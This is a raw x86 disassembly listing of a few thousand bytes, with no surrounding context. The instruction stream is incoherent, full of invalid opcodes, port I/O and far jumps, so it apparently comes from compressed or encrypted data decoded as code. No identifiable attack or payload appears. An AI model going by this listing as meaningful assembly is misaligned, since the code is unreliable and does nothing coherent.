  419466:	fild   DWORD PTR [eax]
  419468:	std    
  419469:	out    dx,al
  41946a:	sub    al,0xbf
  41946c:	lds    esp,FWORD PTR [edi-0x53]
  41946f:	xor    cl,ch
  419471:	std    
  419472:	mov    bl,0xee
  419474:	dec    ecx
  419475:	adc    al,0xb2
  419477:	mov    dx,0x8152
  41947b:	and    eax,0x32bd9feb
  419480:	stos   BYTE PTR es:[edi],al
  419481:	inc    esp
  419482:	mov    eax,0x6fd1f31a
  419487:	icebp  
  419488:	mov    BYTE PTR [ecx+0xa],ch
  41948b:	or     dl,BYTE PTR [edx-0x3f3514fb]
  419491:	push   esi
  419492:	dec    BYTE PTR [eax+0x42320fc5]
  419498:	dec    eax
  419499:	arpl   WORD PTR [ecx+0x29],di
  41949c:	(bad)  
  41949d:	mov    esp,0xc95e11ba
  4194a2:	jmp    0x4194b4
  4194a4:	popa   
  4194a5:	mov    eax,0x46672161
  4194aa:	sub    al,0xd8
  4194ac:	aas    
  4194ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4194ae:	arpl   WORD PTR [edx-0x58d24003],bx
  4194b4:	(bad)  
  4194b5:	pop    esp
  4194b6:	data16 adc BYTE PTR [ecx+0x55e8b7fa],dl
  4194bd:	mov    ecx,0xcc848f92
  4194c2:	mov    al,ds:0x7d5bf82b
  4194c7:	js     0x41952c
  4194c9:	add    cl,BYTE PTR [eax+esi*1]
  4194cc:	(bad)  
  4194ce:	leave  
  4194cf:	jnp    0x419505
  4194d1:	fimul  WORD PTR [eax+edi*2+0x2e525814]
  4194d8:	cs inc edi
  4194da:	ja     0x4194c7
  4194dc:	xor    cl,BYTE PTR [eax]
  4194de:	int3   
  4194df:	xchg   ebp,eax
  4194e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4194e1:	es push ecx
  4194e3:	xchg   edi,eax
  4194e4:	(bad)  
  4194e5:	mov    eax,0xfd3b8447
  4194ea:	inc    edi
  4194eb:	addr16 fcmovnbe st,st(1)
  4194ee:	cmp    eax,0xc7b26f56
  4194f3:	inc    eax
  4194f4:	icebp  
  4194f5:	adc    ch,bh
  4194f7:	int3   
  4194f8:	aad    0xeb
  4194fa:	xlat   BYTE PTR ds:[ebx]
  4194fb:	push   ds
  4194fc:	adc    eax,0x58921b6c
  419501:	cmp    edx,ebp
  419503:	jno    0x41950b
  419505:	jbe    0x41954c
  419507:	icebp  
  419508:	test   al,0xa1
  41950a:	mov    bl,0x6d
  41950c:	shl    DWORD PTR [eax+0xd870c34],1
  419512:	call   0x5e0a:0x843e6c41
  419519:	imul   ebx,ebx,0xc90fa0e7
  41951f:	es push 0xffffffa7
  419522:	(bad)  
  419523:	ins    BYTE PTR es:[edi],dx
  419524:	pushf  
  419525:	lods   al,BYTE PTR ds:[esi]
  419526:	in     eax,0x4b
  419528:	sub    BYTE PTR ds:0x21ddce15,0xcc
  41952f:	fidivr DWORD PTR [ebp+edx*2-0x80]
  419533:	repnz adc al,0xd3
  419536:	sbb    edx,DWORD PTR [ecx+0xf]
  419539:	(bad)  
  41953a:	sbb    al,0x34
  41953c:	in     al,dx
  41953d:	sub    bh,dh
  41953f:	mov    ?,WORD PTR [eax-0xf]
  419542:	cmc    
  419543:	ds mov bh,bh
  419546:	push   cs
  419547:	es add edi,esi
  41954a:	dec    esi
  41954b:	in     eax,dx
  41954c:	cmp    al,0x9f
  41954e:	mov    edi,0x468dd499
  419553:	cld    
  419554:	mov    ds:0x321cc96f,eax
  419559:	mov    esi,DWORD PTR [esp+ebx*8]
  41955c:	jecxz  0x4195bb
  41955e:	loopne 0x41951b
  419560:	sbb    bl,BYTE PTR [edx+eax*2-0x1cd7a2c6]
  419567:	dec    ebx
  419568:	sbb    BYTE PTR [ebp-0x43ee53a],ah
  41956e:	adc    bh,ah
  419570:	aad    0xf1
  419572:	mov    ch,al
  419574:	out    dx,eax
  419575:	pusha  
  419576:	out    dx,eax
  419577:	pop    es
  419578:	dec    edx
  419579:	dec    eax
  41957a:	inc    ebx
  41957b:	sbb    esi,0xa2e28d86
  419581:	jbe    0x419524
  419583:	(bad)  
  419584:	popf   
  419585:	ins    DWORD PTR es:[edi],dx
  419586:	nop
  419587:	push   ds
  419588:	jbe    0x419575
  41958a:	and    eax,0x6173a7c
  41958f:	mov    eax,ds:0x2def977b
  419594:	xor    esp,DWORD PTR [ecx+eax*8-0x3e0cd978]
  41959b:	pop    ds
  41959c:	jno    0x41954e
  41959e:	add    DWORD PTR [ecx],0xea4cc818
  4195a4:	das    
  4195a5:	sub    DWORD PTR [edi+esi*8],ebx
  4195a8:	div    eax
  4195aa:	add    eax,0xf39ef9d7
  4195af:	lods   eax,DWORD PTR ds:[esi]
  4195b0:	sbb    BYTE PTR [edx],ah
  4195b2:	not    BYTE PTR [ecx-0x5ef17c5]
  4195b8:	call   0xab22:0x8ffa836a
  4195bf:	dec    DWORD PTR [ecx]
  4195c1:	mov    ebx,0xa70e1274
  4195c6:	aam    0xfc
  4195c8:	inc    ebp
  4195c9:	xchg   esi,eax
  4195ca:	mov    ebx,0x86cf5d89
  4195cf:	sbb    DWORD PTR ds:0xe11257fb,0x8016646e
  4195d9:	fld    DWORD PTR [esi+0x7767346f]
  4195df:	std    
  4195e0:	mov    DWORD PTR [esi+0x4572fb25],ebx
  4195e6:	ffreep st(1)
  4195e8:	mov    ebx,0xcbcbe1cf
  4195ed:	dec    ebp
  4195ee:	inc    ecx
  4195ef:	jno    0x4195a2
  4195f1:	out    0x3e,al
  4195f3:	cmc    
  4195f4:	xlat   BYTE PTR ds:[ebx]
  4195f5:	push   edx
  4195f6:	fsubr  DWORD PTR [esi-0x418f549e]
  4195fc:	dec    esp
  4195fd:	sub    cl,BYTE PTR [ecx]
  4195ff:	and    DWORD PTR [eax],0x6f
  419602:	inc    ebx
  419603:	outs   dx,DWORD PTR ss:[esi]
  419605:	stc    
  419606:	(bad)  
  419608:	stos   DWORD PTR es:[edi],eax
  419609:	inc    edx
  41960a:	sub    BYTE PTR [ecx],ch
  41960c:	cmp    DWORD PTR [ebx-0x17],edi
  41960f:	pop    esp
  419610:	and    BYTE PTR [ebp+0x36d183ad],dh
  419616:	mov    esi,0x6d29ec3c
  41961b:	sbb    DWORD PTR [ebx-0x791b0979],0xffffff99
  419622:	mov    edi,0x7932c064
  419627:	xor    eax,0x93baf89a
  41962c:	sbb    eax,0xe38bb9b9
  419631:	dec    eax
  419632:	add    eax,0x97397032
  419637:	(bad)  
  419638:	arpl   WORD PTR [ebp+0x5e72f71a],ax
  41963e:	sub    BYTE PTR [ebp+0x7c],bh
  419641:	pop    esp
  419642:	mov    ebx,0x63db8364
  419647:	mov    WORD PTR [esp+ebx*8+0x7e],cs
  41964b:	jg     0x41969a
  41964d:	mov    esi,0x751696f0
  419652:	ror    BYTE PTR [ebx+0x6f],cl
  419655:	sub    ch,ah
  419657:	pusha  
  419658:	in     eax,0xd8
  41965a:	pop    edi
  41965b:	pop    esi
  41965c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41965d:	loop   0x4195ea
  41965f:	js     0x419667
  419661:	sbb    eax,0x7ea31a5f
  419666:	sar    BYTE PTR ds:0x8ad6e2f6,cl
  41966c:	and    al,0x16
  41966e:	mov    DWORD PTR [ebx],edi
  419670:	adc    WORD PTR ds:0x78b4d84c,0xe53d
  419679:	dec    ebx
  41967a:	mov    ss,WORD PTR [ecx]
  41967c:	aad    0x72
  41967e:	push   ecx
  41967f:	repz mov bh,0x23
  419682:	mov    bl,BYTE PTR [ebx+0x2a8f2192]
  419688:	(bad)
  41968c:	or     cl,BYTE PTR [si]
  41968f:	jo     0x4196d1
  419691:	frstor [ecx+0x64a90e1f]
  419697:	mov    al,ds:0x18ee6b9a
  41969c:	mov    dh,0xc0
  41969e:	push   ecx
  41969f:	mov    dl,0xe5
  4196a1:	pop    ss
  4196a2:	jns    0x419630
  4196a4:	mov    bh,0x93
  4196a6:	icebp  
  4196a7:	inc    ebx
  4196a8:	in     eax,dx
  4196a9:	push   ebp
  4196aa:	cwde   
  4196ab:	dec    ebx
  4196ac:	jne    0x419729
  4196ae:	pop    es
  4196af:	lods   eax,DWORD PTR ds:[esi]
  4196b0:	sbb    BYTE PTR [esi],cl
  4196b2:	ficom  WORD PTR [ecx+edi*8+0x7a8d4728]
  4196b9:	rcl    DWORD PTR es:[edi-0x39],1
  4196bd:	dec    eax
  4196be:	clc    
  4196bf:	push   ds
  4196c0:	fidivr WORD PTR [eax+0x5f]
  4196c3:	push   esi
  4196c4:	out    0x1f,al
  4196c6:	add    eax,0xf7f5b8ef
  4196cb:	shl    DWORD PTR [ecx-0x64],cl
  4196ce:	nop
  4196cf:	test   DWORD PTR [eax+0x3eef1e2b],ebx
  4196d5:	loope  0x4196ed
  4196d7:	jo     0x419749
  4196d9:	xchg   ecx,eax
  4196da:	jle    0x419672
  4196dc:	jl     0x4196ef
  4196de:	xor    al,0x12
  4196e0:	xchg   edx,eax
  4196e1:	ins    DWORD PTR es:[edi],dx
  4196e2:	repz or DWORD PTR [ebx-0x1fca269d],ebp
  4196e9:	and    al,BYTE PTR [eax+ecx*2-0x1b]
  4196ed:	inc    esp
  4196ee:	sub    eax,0x469ddc63
  4196f3:	imul   edx,DWORD PTR [ebx],0xffffffb7
  4196f6:	lods   al,BYTE PTR ds:[esi]
  4196f7:	je     0x41976f
  4196f9:	push   ds
  4196fa:	ds (bad) 
  4196fc:	rol    BYTE PTR [eax+0x35],0xdc
  419700:	rcl    DWORD PTR [esi-0xb],cl
  419703:	bound  ebx,QWORD PTR [esi]
  419705:	pop    esi
  419706:	add    BYTE PTR gs:[eax-0x30],cl
  41970a:	push   0x20
  41970c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41970d:	daa    
  41970e:	jns    0x4196fa
  419710:	mov    bl,0xb0
  419712:	mov    ecx,0x2b4c86c1
  419717:	jmp    0x87c9:0x9d3f18c4
  41971e:	retf   
  41971f:	and    eax,0xc7e64a77
  419724:	jl     0x419747
  419726:	cmp    ch,BYTE PTR [edi]
  419728:	bound  eax,QWORD PTR [edx+0x6f]
  41972b:	or     al,0x8
  41972d:	lock add esp,DWORD PTR [edi+edi*8+0x3063b578]
  419735:	pushf  
  419736:	adc    ebp,edx
  419738:	adc    al,0x3
  41973a:	jne    0x4196da
  41973c:	xor    BYTE PTR [edx],0x28
  41973f:	xchg   esi,eax
  419740:	and    dl,bh
  419742:	sub    al,0xac
  419744:	xor    al,0xfe
  419746:	arpl   WORD PTR [ebx+0x7a9a3cb3],bp
  41974c:	xor    al,ah
  41974e:	or     ch,0x83
  419751:	mov    esp,0x38240acc
  419756:	or     dl,BYTE PTR [edx+0x61246b06]
  41975c:	and    BYTE PTR [ecx+0x61],0xc1
  419760:	loopne 0x41979d
  419762:	cli    
  419763:	sti    
  419764:	xchg   esi,edi
  419766:	js     0x4197d5
  419768:	mov    ebp,0xb99e1a33
  41976d:	call   0xf74f9e10
  419772:	pop    ecx
  419773:	sub    eax,DWORD PTR [edi+0x5b7111b0]
  419779:	mov    dh,0xe2
  41977b:	jb     0x4197af
  41977d:	and    al,0xb3
  41977f:	push   edi
  419780:	cmp    DWORD PTR [ebx+0x62],edx
  419783:	call   0x559ef3dc
  419788:	mov    DWORD PTR [ecx],ecx
  41978a:	popf   
  41978b:	ret    0xe51b
  41978e:	mov    DWORD PTR [eax+0x5f],edi
  419791:	mov    ecx,0x6ca20b15
  419796:	aam    0x94
  419798:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419799:	mov    ds:0x759da8e8,eax
  41979e:	xor    eax,0x862e1909
  4197a3:	push   ebp
  4197a4:	arpl   WORD PTR [ebp-0x782a98b4],bp
  4197aa:	js     0x4197d7
  4197ac:	push   cs
  4197ad:	xchg   esp,eax
  4197ae:	add    BYTE PTR [ecx-0x159d642f],bl
  4197b4:	xchg   ebp,eax
  4197b5:	xchg   esi,eax
  4197b6:	shl    cl,0xbf
  4197b9:	dec    esi
  4197ba:	cdq    
  4197bb:	and    ecx,edx
  4197bd:	test   BYTE PTR [edi+0x32],cl
  4197c0:	stos   DWORD PTR es:[edi],eax
  4197c1:	mov    BYTE PTR [eax+0x7d4b6d38],dl
  4197c7:	mov    ds:0xceb4f571,eax
  4197cc:	scas   al,BYTE PTR es:[edi]
  4197cd:	and    esi,DWORD PTR [esi-0x3f]
  4197d0:	sub    eax,0x676a09c1
  4197d5:	or     al,0x52
  4197d7:	out    0x1b,eax
  4197d9:	call   0x88a443ca
  4197de:	inc    ebx
  4197df:	xchg   esi,eax
  4197e0:	add    ah,BYTE PTR [ecx-0x2]
  4197e3:	rcr    DWORD PTR [esi-0x6e80b33],1
  4197e9:	mov    WORD PTR [esi+0x3c],gs
  4197ec:	stos   DWORD PTR es:[edi],eax
  4197ed:	data16 mov dh,0x73
  4197f0:	jge    0x4197e2
  4197f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4197f3:	pop    ds
  4197f4:	dec    eax
  4197f5:	inc    ebx
  4197f6:	adc    ch,BYTE PTR [edi]
  4197f8:	(bad)  
  4197f9:	jno    0x4197fe
  4197fb:	call   0x3e2011bb
  419800:	push   esi
  419801:	lahf   
  419802:	in     al,dx
  419803:	mov    ah,BYTE PTR [esi]
  419805:	fwait
  419806:	icebp  
  419807:	sbb    esp,eax
  419809:	icebp  
  41980a:	gs retf 0x174b
  41980e:	jge    0x4197af
  419810:	jp     0x419889
  419812:	xchg   edx,eax
  419813:	mov    dl,0x73
  419815:	inc    edx
  419816:	gs (bad) 
  419818:	shl    BYTE PTR [esi+0x57],1
  41981b:	(bad)  
  41981c:	mov    dh,0xfc
  41981e:	inc    esp
  41981f:	jae    0x4197ee
  419821:	adc    ebx,eax
  419823:	or     esi,ecx
  419825:	das    
  419826:	mov    ch,0x95
  419828:	jmp    0xb515:0x982da69a
  41982f:	pusha  
  419830:	xor    BYTE PTR [edx+0x41],ch
  419833:	inc    edx
  419834:	jmp    0x41989a
  419836:	sbb    ebx,DWORD PTR [ebp+0x293eb7ba]
  41983c:	xchg   ebx,eax
  41983d:	retf   0xd70f
  419840:	inc    eax
  419842:	jo     0x419884
  419844:	lods   al,BYTE PTR ds:[esi]
  419845:	ret    
  419846:	adc    eax,esi
  419848:	mov    ah,0x9b
  41984a:	mov    al,0x2b
  41984c:	sar    ebp,1
  41984e:	fs xchg ecx,eax
  419850:	pusha  
  419851:	ins    DWORD PTR es:[edi],dx
  419852:	push   edi
  419853:	pop    ebp
  419854:	mov    ah,0x47
  419856:	mov    ebp,edi
  419858:	sbb    al,0xa9
  41985a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41985b:	ins    DWORD PTR es:[edi],dx
  41985c:	mov    ecx,0x7e50edbf
  419861:	xor    DWORD PTR [ebx+0x60],edi
  419864:	arpl   sp,di
  419866:	mov    ebp,0xfc5587ec
  41986b:	xchg   di,ax
  41986d:	div    dh
  41986f:	mov    ah,0xc6
  419871:	adc    DWORD PTR [ebx],ebx
  419873:	xlat   BYTE PTR ds:[ebx]
  419874:	vpmacsdd xmm10,xmm1,XMMWORD PTR ds:[eax+0x5d],xmm7
  41987c:	add    al,0xf3
  41987e:	cld    
  41987f:	sbb    DWORD PTR [edx+0x62e364a8],ecx
  419885:	mov    bh,0x49
  419887:	inc    ebx
  419888:	fild   DWORD PTR [ebx+0x6e]
  41988b:	xor    BYTE PTR [edx+edi*8-0x13a74ba6],al
  419892:	mov    ah,bl
  419894:	in     eax,0x4
  419896:	lahf   
  419897:	xchg   edi,eax
  419898:	in     al,0x4
  41989a:	arpl   di,dx
  41989c:	sub    DWORD PTR [edi+0x44dd58f],0xffffffbb
  4198a3:	mov    bh,0x6
  4198a5:	enter  0xd1bd,0x2a
  4198a9:	jno    0x419861
  4198ab:	loope  0x419843
  4198ad:	pop    esp
  4198ae:	int3   
  4198af:	test   al,0x97
  4198b1:	call   0xabbf:0xfe9708cf
  4198b8:	inc    edi
  4198b9:	mov    ah,0x1c
  4198bb:	ins    DWORD PTR es:[edi],dx
  4198bc:	lahf   
  4198bd:	jmp    0x419932
  4198bf:	bound  esp,QWORD PTR [eax+0x62]
  4198c2:	cmp    edi,DWORD PTR [ebp+eax*8+0x1]
  4198c6:	test   ah,0xae
  4198c9:	arpl   WORD PTR [esi-0x78],dx
  4198cc:	dec    esi
  4198cd:	sub    al,0x84
  4198cf:	fmul   st,st(5)
  4198d1:	arpl   di,bx
  4198d3:	xor    al,0x1c
  4198d5:	cld    
  4198d6:	sub    DWORD PTR [ecx+0x6f],ebp
  4198d9:	in     eax,dx
  4198da:	xor    DWORD PTR [edi-0x6e],esp
  4198dd:	add    BYTE PTR [edi-0x20],cl
  4198e0:	add    BYTE PTR ds:0xcb3b8064,0x42
  4198e7:	or     eax,0x7af40c42
  4198ec:	and    al,0x8
  4198ee:	fst    QWORD PTR [edi]
  4198f0:	lea    ebp,[edx+eax*1-0x61]
  4198f4:	sub    eax,0x63d9b833
  4198f9:	inc    edi
  4198fa:	ins    BYTE PTR es:[edi],dx
  4198fb:	inc    edx
  4198fc:	dec    cx
  4198fe:	xchg   edi,eax
  4198ff:	test   al,0xd4
  419901:	repz out 0x6f,al
  419904:	imul   ecx,DWORD PTR [edx],0xf4204928
  41990a:	xchg   edi,eax
  41990b:	lods   eax,DWORD PTR ds:[esi]
  41990c:	(bad)  
  41990d:	sbb    dh,dh
  41990f:	retf   0xa994
  419912:	dec    edx
  419913:	aad    0x6a
  419915:	int    0x7
  419917:	pop    edx
  419918:	retf   
  419919:	mov    bl,0x4e
  41991b:	mov    esi,0x1df82f6e
  419920:	loop   0x41990d
  419922:	and    ecx,0x4ef99444
  419928:	inc    edx
  419929:	sub    edi,edi
  41992b:	js     0x41992e
  41992d:	or     BYTE PTR [eiz*2+0x32b6cd8e],bl
  419934:	jno    0x4198c5
  419936:	push   es
  419937:	ins    DWORD PTR es:[edi],dx
  419938:	sar    BYTE PTR [ecx+0x60],cl
  41993b:	call   0xf781b562
  419940:	sub    DWORD PTR [eax-0x13],edx
  419943:	cmp    ecx,DWORD PTR [esi+0x21]
  419946:	(bad)  
  419947:	ins    BYTE PTR es:[edi],dx
  419948:	jns    0x4198ff
  41994a:	mov    cl,0xc9
  41994c:	push   ebp
  41994d:	out    dx,eax
  41994e:	iret   
  41994f:	sbb    eax,0x7b230f86
  419954:	sub    ecx,DWORD PTR [esi+ebp*8+0x38ad7ebe]
  41995b:	lahf   
  41995c:	mov    al,ds:0xe42d155d
  419961:	lock mov al,0xd3
  419964:	cmp    edx,esi
  419966:	(bad)  
  419967:	rol    BYTE PTR ds:0x4d266219,1
  41996d:	sbb    al,0x37
  41996f:	jmp    0xa2d93def
  419974:	sub    al,0x65
  419976:	stos   DWORD PTR es:[edi],eax
  419977:	cmp    bh,0x67
  41997a:	dec    eax
  41997b:	mov    dl,0x84
  41997d:	sar    DWORD PTR [ecx-0x5e],cl
  419980:	xchg   ecx,eax
  419981:	cdq    
  419982:	outs   dx,DWORD PTR ds:[esi]
  419983:	sub    dh,cl
  419985:	popa   
  419986:	rcl    BYTE PTR ds:0xf412210e,1
  41998c:	push   esp
  41998d:	popa   
  41998e:	mov    bh,0x2
  419990:	jae    0x419988
  419992:	stc    
  419993:	dec    ebx
  419994:	cmp    ch,BYTE PTR [edx+0x5ffd0ba8]
  41999a:	out    0xed,al
  41999c:	rcr    edx,0xf5
  41999f:	ins    BYTE PTR es:[edi],dx
  4199a0:	sub    eax,DWORD PTR [ecx]
  4199a2:	jge    0x4199e2
  4199a4:	lock lahf 
  4199a6:	(bad)
  4199aa:	or     al,BYTE PTR [ebx]
  4199ac:	jo     0x419a21
  4199ae:	add    DWORD PTR [ebp-0x2fd6d97e],eax
  4199b4:	push   0xcbfeaee6
  4199b9:	dec    edx
  4199ba:	cmp    eax,0x89ac6b1d
  4199bf:	inc    ecx
  4199c0:	jbe    0x419987
  4199c2:	pop    ebx
  4199c3:	aad    0xa9
  4199c5:	pushf  
  4199c6:	adc    DWORD PTR [ebp+0x19],edx
  4199c9:	mov    ?,eax
  4199cb:	(bad)  
  4199cc:	popf   
  4199cd:	retf   
  4199ce:	xchg   ebp,eax
  4199cf:	adc    ah,BYTE PTR [ebp+0x6923e1a6]
  4199d5:	add    ecx,ebx
  4199d7:	(bad)  
  4199d8:	mov    eax,ds:0x9fd33441
  4199dd:	popf   
  4199de:	dec    ebx
  4199df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4199e0:	mov    WORD PTR [esi],fs
  4199e2:	adc    eax,0x52ff7607
  4199e7:	iret   
  4199e8:	fld    DWORD PTR [ebx+0x4c8a2209]
  4199ee:	popa   
  4199ef:	adc    ch,bh
  4199f1:	mov    ch,0x68
  4199f3:	jmp    0x4199ba
  4199f5:	out    dx,eax
  4199f6:	or     ecx,esi
  4199f8:	xlat   BYTE PTR ds:[ebx]
  4199f9:	idiv   BYTE PTR [esi]
  4199fb:	in     eax,dx
  4199fc:	in     eax,0x65
  4199fe:	push   cs
  4199ff:	aad    0xec
  419a01:	loop   0x419a22
  419a03:	mov    esi,0xa5d25acf
  419a08:	pop    edx
  419a09:	and    BYTE PTR [ebx+ecx*1+0x13],bh
  419a0d:	mov    ?,ebx
  419a0f:	popa   
  419a10:	jecxz  0x419a64
  419a12:	ror    BYTE PTR [esi-0x7593d51f],0x4a
  419a19:	xchg   esp,eax
  419a1a:	dec    ebp
  419a1b:	mov    al,0x9e
  419a1d:	out    dx,al
  419a1e:	scas   al,BYTE PTR es:[edi]
  419a1f:	call   0xfede98ca
  419a24:	inc    eax
  419a25:	push   cs
  419a26:	mov    ds:0xa24ea17,eax
  419a2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a2c:	stos   BYTE PTR es:[edi],al
  419a2d:	mov    edx,0x58a5ef9f
  419a32:	rol    edi,cl
  419a34:	push   0x56
  419a36:	mov    dl,0x7
  419a38:	in     eax,0xc8
  419a3a:	xchg   al,bh
  419a3c:	aas    
  419a3d:	lds    eax,FWORD PTR [ecx+0x2e]
  419a40:	cld    
  419a41:	bound  esp,QWORD PTR [ebx]
  419a43:	adc    esp,edi
  419a45:	retf   0xe229
  419a48:	jo     0x4199ef
  419a4a:	out    0x98,al
  419a4c:	ins    BYTE PTR es:[edi],dx
  419a4d:	aaa    
  419a4e:	repz jne 0x419a9b
  419a51:	mov    ecx,gs
  419a53:	push   es
  419a54:	pusha  
  419a55:	push   cs
  419a56:	out    0x76,al
  419a58:	data16 aaa 
  419a5a:	xchg   ebx,eax
  419a5b:	call   0x799d04b2
  419a60:	mov    eax,ds:0x7cba26ba
  419a65:	retf   0x605a
  419a68:	add    BYTE PTR [eax+0x3d6a6e74],dl
  419a6e:	out    dx,eax
  419a6f:	and    esi,eax
  419a71:	cmp    al,0xed
  419a73:	push   edi
  419a74:	call   0x69e6:0x35035a0e
  419a7b:	sub    BYTE PTR [edi],dh
  419a7d:	(bad)  
  419a7e:	shl    cl,cl
  419a80:	cwde   
  419a81:	cdq    
  419a82:	fcom   st(4)
  419a84:	xor    dl,dl
  419a86:	imul   esi,edi,0xffffffe7
  419a89:	fs xchg ecx,eax
  419a8b:	sub    DWORD PTR [edx],0xc33deb8c
  419a91:	cdq    
  419a92:	mov    dl,0x6c
  419a94:	jb     0x419a3b
  419a96:	dec    DWORD PTR [eax+ecx*1-0xa]
  419a9a:	xchg   DWORD PTR [ebp-0x254439e0],ecx
  419aa0:	adc    eax,0x537d0fed
  419aa5:	xchg   BYTE PTR [edi-0x23],dl
  419aa8:	adc    eax,0x9cf4029e
  419aad:	outs   dx,BYTE PTR ds:[esi]
  419aae:	add    ecx,DWORD PTR [edi+ebx*8+0x45f37d11]
  419ab5:	pop    ebp
  419ab6:	fisttp DWORD PTR [ecx-0x7]
  419ab9:	push   cs
  419aba:	or     BYTE PTR ds:0xc0546074,0x39
  419ac1:	(bad)  
  419ac2:	stos   DWORD PTR es:[edi],eax
  419ac3:	out    0x7b,eax
  419ac5:	call   0xb34f:0xb6d364c5
  419acc:	push   ecx
  419acd:	lods   al,BYTE PTR ds:[esi]
  419ace:	out    0x28,al
  419ad0:	add    eax,DWORD PTR [edx]
  419ad2:	outs   dx,BYTE PTR ds:[esi]
  419ad3:	fs dec ecx
  419ad5:	test   BYTE PTR [edx+eiz*1],al
  419ad8:	fsubr  DWORD PTR gs:[ebp-0x6302fc38]
  419adf:	pop    ecx
  419ae0:	xor    esi,ebx
  419ae2:	fist   WORD PTR [ecx-0x53]
  419ae5:	add    esi,DWORD PTR [edx+0x3d]
  419ae8:	inc    esi
  419ae9:	jmp    0xa701c68e
  419aee:	int    0x3a
  419af0:	sti    
  419af1:	or     eax,0x80580270
  419af6:	test   eax,0xd2f17a5
  419afb:	mov    esi,0x7dc1c4c7
  419b00:	mov    DWORD PTR [edx],edi
  419b02:	push   edx
  419b03:	test   DWORD PTR [eax+esi*4-0x73e3060d],ecx
  419b0a:	jo     0x419b0b
  419b0c:	fnstcw WORD PTR [edi]
  419b0e:	add    DWORD PTR [ecx+0x68],edx
  419b11:	xor    esp,esp
  419b13:	jae    0x419ab0
  419b15:	(bad)  
  419b17:	xor    eax,esi
  419b19:	icebp  
  419b1a:	add    cl,al
  419b1c:	(bad)  
  419b1d:	and    eax,0xd1ae17fb
  419b22:	sahf   
  419b23:	xchg   esp,eax
  419b24:	hlt    
  419b25:	hlt    
  419b26:	push   esp
  419b27:	mov    eax,0xa6d0d2b3
  419b2c:	sub    bl,0x48
  419b2f:	sahf   
  419b30:	push   0x65
  419b32:	cmp    ah,BYTE PTR [ebx-0x3]
  419b35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b36:	or     DWORD PTR [eax],ebx
  419b38:	jno    0x419aeb
  419b3a:	xchg   esp,eax
  419b3b:	pop    edx
  419b3c:	(bad)  
  419b3d:	jno    0x419bbd
  419b3f:	dec    ebp
  419b40:	push   ds
  419b41:	out    0x3e,al
  419b43:	fnstcw WORD PTR [eax]
  419b45:	cdq    
  419b46:	fdivr  st,st(2)
  419b48:	push   sp
  419b4a:	mov    eax,ds:0xff475258
  419b4f:	test   eax,0xc8266cbc
  419b54:	mov    al,BYTE PTR [ebx]
  419b56:	mov    edi,0x408c81ef
  419b5b:	loop   0x419b97
  419b5d:	xchg   esp,eax
  419b5e:	popf   
  419b5f:	cmp    al,0x31
  419b61:	cmp    ecx,esp
  419b63:	mov    al,0xf4
  419b65:	stos   BYTE PTR es:[edi],al
  419b66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b67:	jg     0x419b98
  419b69:	mov    bl,0x1f
  419b6b:	mov    esp,0x37707768
  419b70:	mov    ?,WORD PTR [edx]
  419b72:	mov    ds:0xd240d27c,eax
  419b77:	mov    al,ds:0x985ce4fa
  419b7c:	hlt    
  419b7d:	pop    ebp
  419b7e:	out    0x47,eax
  419b80:	jae    0x419bdc
  419b82:	pop    DWORD PTR [esi-0x1ac2a9cf]
  419b88:	idiv   BYTE PTR [edx]
  419b8a:	mov    ebx,0xae29d558
  419b8f:	sub    edx,DWORD PTR [ecx-0x6e]
  419b92:	push   ebp
  419b93:	mov    WORD PTR [eax+ebx*4],cs
  419b96:	shr    DWORD PTR [di+0x5a],1
  419b9a:	jmp    0x419b49
  419b9c:	pop    eax
  419b9d:	test   al,0x76
  419b9f:	aaa    
  419ba0:	in     al,dx
  419ba1:	jge    0x419bb9
  419ba3:	(bad)  
  419ba4:	adc    al,0xc3
  419ba6:	adc    eax,0x44c163fd
  419bab:	sub    eax,0xeac13e26
  419bb0:	push   ds
  419bb1:	pop    esp
  419bb2:	adc    ecx,DWORD PTR [esi-0x4a]
  419bb5:	push   ecx
  419bb6:	sahf   
  419bb7:	iret   
  419bb8:	mov    edx,0x832da617
  419bbd:	or     DWORD PTR [edx+0x2c],0x5d
  419bc1:	iret   
  419bc2:	inc    esi
  419bc3:	int3   
  419bc4:	push   edx
  419bc5:	mov    cl,0x27
  419bc7:	xor    ch,dh
  419bc9:	aad    0x51
  419bcb:	xor    bh,0x5c
  419bce:	xchg   ebp,eax
  419bcf:	xchg   ecx,eax
  419bd0:	scas   eax,DWORD PTR es:[edi]
  419bd1:	or     BYTE PTR [ebp-0x65],ch
  419bd4:	cmp    esi,0x6c271b2c
  419bda:	xchg   edx,eax
  419bdb:	(bad)  
  419bdc:	mov    edx,0x98341313
  419be1:	imul   edx,DWORD PTR [ecx],0xffffffce
  419be4:	xor    ebx,edx
  419be6:	or     BYTE PTR [ebp+0x53],0x19
  419bea:	pushf  
  419beb:	jmp    0x419b70
  419bed:	js     0x419b90
  419bef:	jecxz  0x419bdb
  419bf1:	sbb    esp,eax
  419bf3:	pop    ebx
  419bf4:	sub    BYTE PTR [ebx+0x2666c935],0xca
  419bfb:	gs loope 0x419ba9
  419bfe:	fs add eax,0xd4d58aa9
  419c04:	add    al,0xb6
  419c06:	push   es
  419c07:	cdq    
  419c08:	add    bl,BYTE PTR [edi]
  419c0a:	pop    edx
  419c0b:	retf   0xc225
  419c0e:	xlat   BYTE PTR ds:[ebx]
  419c0f:	add    esp,ebx
  419c11:	and    al,0xa8
  419c13:	mov    cl,0xfd
  419c15:	dec    edi
  419c16:	mov    eax,ds:0x8c1461d4
  419c1b:	ret    
  419c1c:	sub    ebx,edi
  419c1e:	add    al,0xee
  419c20:	jbe    0x419c9e
  419c22:	mov    eax,0x91396aae
  419c27:	loope  0x419c6b
  419c29:	cli    
  419c2a:	mul    DWORD PTR [edi+0x5d262c54]
  419c30:	cmp    BYTE PTR [eax-0x5d2fe0f6],ah
  419c36:	push   esp
  419c37:	push   cs
